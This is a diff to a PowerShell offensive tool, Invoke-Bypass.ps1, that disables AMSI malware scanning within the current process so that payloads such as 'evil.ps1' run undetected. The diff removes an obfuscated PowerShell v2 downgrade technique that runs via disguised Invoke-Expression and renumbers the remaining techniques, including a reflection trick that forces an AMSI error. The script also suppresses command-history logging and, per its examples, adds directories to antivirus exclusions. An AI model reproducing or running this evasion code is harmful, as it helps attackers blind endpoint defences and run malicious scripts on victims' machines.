@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Assembly {native}
    Optional Dependencies: IWR {native}
-   PS cmdlet Dev version: v1.1.13
+   PS cmdlet Dev version: v1.1.14
 
 .DESCRIPTION
    This cmdlet attempts to disable AMS1 string scanning within
@@ -49,7 +49,7 @@
    Bypass ams1 detection on current proccess and execute evil.ps1
 
 .EXAMPLE
-   PS C:\> .\Invoke-Bypass.ps1 -technic "3" -filepath "evil.ps1" -fileargs "-action 'true'"
+   PS C:\> .\Invoke-Bypass.ps1 -technic "1" -filepath "evil.ps1" -fileargs "-action 'true'"
    Bypass ams1 detection on current proccess and execute evil.ps1 with arguments (parameters)
 
 .EXAMPLE
@@ -57,7 +57,7 @@
    Bypass ams1 detection on current proccess and download\execute sysinfo.ps1 with arguments ( -sysinfo enum )
 
 .EXAMPLE
-   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "$Env:TMP\evil.ps1" -ExcludeLocation "$Env:TMP"
+   PS C:\> .\Invoke-Bypass.ps1 -technic "1" -filepath "$Env:TMP\evil.ps1" -ExcludeLocation "$Env:TMP"
    Bypass ams1 detection on current proccess, execute evil.ps1 and add 'TMP' dir to AV exclusion path.
 
 .INPUTS
@@ -92,7 +92,7 @@
 )
 
 
-$cmdletVersion = "v1.1.13"
+$cmdletVersion = "v1.1.14"
 #Cmdlet Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 #Disable Powershell Command Logging for current session.
@@ -100,7 +100,7 @@ Set-PSReadlineOption HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "@Invoke-Bypass $cmdletVersion"
 Write-Host "`n* Disable AM`S`1 within current process." -ForegroundColor Green
 
-If($Technic -lt 1 -or $Technic -gt 3)
+If($Technic -lt 1 -or $Technic -gt 2)
 {
    [int]$Technic = 2
    write-host "  + " -ForegroundColor DarkYellow -NoNewline;
@@ -123,9 +123,8 @@ If($List -iMatch "^(technic|technics)$")
    write-host " Listing A`MS`1 bypasses available .." -ForegroundColor DarkGray
    write-host "`n  Technic  Description" -ForegroundColor DarkYellow
    write-host "  -------  -----------"
-   write-host "  1        PS`V2_DO`WNGR`ADE"
-   write-host "  2        FORC`E_AM`SI_ERROR"
-   write-host "  3        AM`SI_UT`ILS_P`AT`CH"
+   write-host "  1        FORC`E_AM`SI_ERROR"
+   write-host "  2        AM`SI_UT`ILS_P`AT`CH"
    write-host ""
    write-host "* " -ForegroundColor Green -NoNewline;
    write-host "Syntax examples:" -ForegroundColor DarkGray
@@ -190,81 +189,6 @@ If($Technic -eq 1)
    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Disclosure: @nullbyte
-      Helper - PS`V2_DO`WNGR`ADE!
-   #>
-
-   $Disclosure = "@nullbyte"
-   $TechnicName = "PS`V2_DO`WNGR`ADE"
-
-   #Retrieve NET Framework version
-   $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse|Get-ItemProperty -name Version -EA 0|Where-Object{$_.PSChildName -match '^(?!S)\p{L}'}).Version
-   If($NETversions -Match "2.0.50727")
-   {
-
-      write-host "`n`n  Technic     : $Technic"
-      write-host "  Bypass      : Success" -ForegroundColor Green
-      write-host "  Disclosure  : $Disclosure"
-      write-host "  Description : $TechnicName"
-
-      If($FilePath -ne "false")
-      {
-         If($FilePath -Match '\\')
-         {
-            $FilePath = $FilePath.Split('\')[-1]    # evil.ps1
-         }
-
-         write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
-         write-host "  Report      : String detection DISABLED on console!"
-         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline
-         write-host "$FilePath`n" -ForegroundColor Green
-
-         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
-         "$DownGradedPSesion"|&('{0}ex' -F'I')
-      }
-      ElseIf($PayloadUrl -ne "false")
-      {
-         $FilePath = $PayloadURL.Split('/')[-1]   # evil.ps1   
-         write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
-         write-host "  Report      : String detection DISABLED on console!"
-         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline
-         write-host "$FilePath`n" -ForegroundColor Green
-
-         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
-         "$DownGradedPSesion"|&('{0}ex' -F'I')
-      }
-      Else
-      {
-         $returnversion = (Get-Host).Version.Major
-         write-host "  POC         : Execute: $Forbiden" -ForegroundColor DarkYellow
-         write-host "  Report      : String detection DISABLED on console!"
-         write-host "  Remark      : Exec 'exit' to return to PS version ${returnversion}"
-         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
-         write-host "powersh`ell -`ve`rsio`n 2`n" -ForegroundColor Green;
-
-         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
-         "$DownGradedPSesion"|&('{0}ex' -F'I')
-      }
-   }
-   Else
-   {
-      write-host "`n`n  Technic     : $Technic"
-      write-host "  Bypass      : Fail" -ForegroundColor DarkRed
-      write-host "  Disclosure  : $Disclosure"
-      write-host "  Description : $TechnicName"
-      write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
-      write-host "  Report      : " -NoNewline;
-      write-host ".Net version 2.0.50727 not found. Can't start PowerShell V2`n`n" -ForegroundColor DarkRed
-   }
-
-exit
-}
-ElseIf($Technic -eq 2)
-{
-
-   <#
-   .SYNOPSIS
-      Author: @r00t-3xp10it
       Disclosure: @mattifestation
       Helper - FORC`E_AM`SI_ERROR!
    #>
@@ -284,7 +208,7 @@ ElseIf($Technic -eq 2)
       $Spotfix.SetValue($null,[bool]0x12AE)
    }Catch{Throw $_}
 }
-ElseIf($Technic -eq 3)
+ElseIf($Technic -eq 2)
 {
 
    <#
